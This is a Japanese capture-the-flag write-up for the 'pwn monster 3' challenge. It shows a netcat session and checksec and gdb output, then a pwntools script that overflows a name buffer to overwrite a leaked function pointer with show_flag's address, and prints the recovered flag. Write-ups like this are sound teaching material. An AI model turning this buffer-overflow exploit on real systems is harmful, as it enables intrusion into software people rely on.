# pwn monster 3:Pwn:300pts
対策してもバグで勝つ人が多いので、pwn monster 3では勝ってもフラグを貰えないようにしました。  
`nc 35.200.120.35 9003`  
[pwn_monster_3.zip](pwn_monster_3.zip)  

# Solution
[pwn monster 1](../pwn_monster_1)や[pwn monster 2](../pwn_monster_2)の続きのようだ。  
勝ってもフラグがもらえない鬼仕様になっている。  
とりあえずncしてみる。  
```bash
$ nc 35.200.120.35 9003
 ____                 __  __                 _
|  _ \__      ___ __ |  \/  | ___  _ __  ___| |_ ___ _ __
| |_) \ \ /\ / / '_ \| |\/| |/ _ \| '_ \/ __| __/ _ \ '__|
|  __/ \ V  V /| | | | |  | | (_) | | | \__ \ ||  __/ |
|_|     \_/\_/ |_| |_|_|  |_|\___/|_| |_|___/\__\___|_|
                        Press Any Key

Welcome to Pwn Monster World!
I'll give your first monster!
Let's give your monster a name!
+--------+--------------------+----------------------+
|name    | 0x0000000000000000 |                      |
|        | 0x0000000000000000 |                      |
|HP      | 0x0000000000000064 |                  100 |
|ATK     | 0x000000000000000a |                   10 |
|cry()   | 0x000055e36531434e |                      |
+--------+--------------------+----------------------+
Input name: Satoki
+--------+--------------------+----------------------+
|name    | 0x0000696b6f746153 |               Satoki |
|        | 0x0000000000000000 |                      |
|HP      | 0x0000000000000064 |                  100 |
|ATK     | 0x000000000000000a |                   10 |
|cry()   | 0x000055e36531434e |                      |
+--------+--------------------+----------------------+
OK, Nice name.
Let's battle with Rival! If you win, give you FLAG.
[You] Satoki HP: 100
[Rival] pwnchu HP: 9999
Your Turn.
Satoki: GRRRR....
Rival monster took 10 damage!
[You] Satoki HP: 100
[Rival] pwnchu HP: 9989
Rival Turn.
pwnchu: pwnchu!
Your monster took 9999 damage!
[You] Satoki HP: -9899
[Rival] pwnchu HP: 9989
Lose...

```
`cry()`という謎のアドレスが表示されている。  
そして`Satoki: GRRRR....`という出力も見える(GRRRR....ってｗ)。  
BOFでリターンアドレスを書き換えろということのようだ。  
配布されたソースを見ると`show_flag()`なる関数があるのでそこへ飛ばす。  
```bash
$ checksec --file=vuln
[*] '/vuln'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
$ gdb vuln
~~~
gdb-peda$ disass show_flag
Dump of assembler code for function show_flag:
   0x0000000000001286 <+0>:     endbr64
   0x000000000000128a <+4>:     push   rbp
   0x000000000000128b <+5>:     mov    rbp,rsp
~~~
```
cryのアドレスがわかっているので、下二桁を286に変えればよい。  
以下のgrrrr.pyで行う。  
```python:grrrr.py
import re
from pwn import *

io = remote("35.200.120.35", 9003)

_ = io.recv(512)
address = io.recv(512).decode().split("\n")[9][13:26] + "286"
print(address)

payload = b"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
payload += bytes.fromhex(address)[::-1] + b"\n"
io.send(payload)

io.interactive()
```
実行する。  
```bash
$ python grrrr.py
[+] Opening connection to 35.200.120.35 on port 9003: Done
0000556f25b3d286
[*] Switching to interactive mode
+--------+--------------------+----------------------+
|name    | 0x4141414141414141 |             AAAAAAAA |
|        | 0x4141414141414141 |             AAAAAAAA |
|HP      | 0x4141414141414141 |  4702111234474983745 |
|ATK     | 0x4141414141414141 |  4702111234474983745 |
|cry()   | 0x0000556f25b3d286 |                      |
+--------+--------------------+----------------------+
OK, Nice name.
Let's battle with Rival! If you win, give you FLAG.
[You] AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x86ҳ%oU HP: 4702111234474983745
[Rival] pwnchu HP: 9999
Your Turn.
nitic_ctf{rewrite_function_pointer_is_fun}

AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x86ҳ%oU: (null)
Rival monster took 4702111234474983745 damage!
[You] AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x86ҳ%oU HP: 4702111234474983745
[Rival] pwnchu HP: -4702111234474973746
Win!
Rival: I don't want to give you FLAG! bye~~
[*] Got EOF while reading in interactive
$
[*] Interrupted
```
flagが表示された。  

## nitic_ctf{rewrite_function_pointer_is_fun}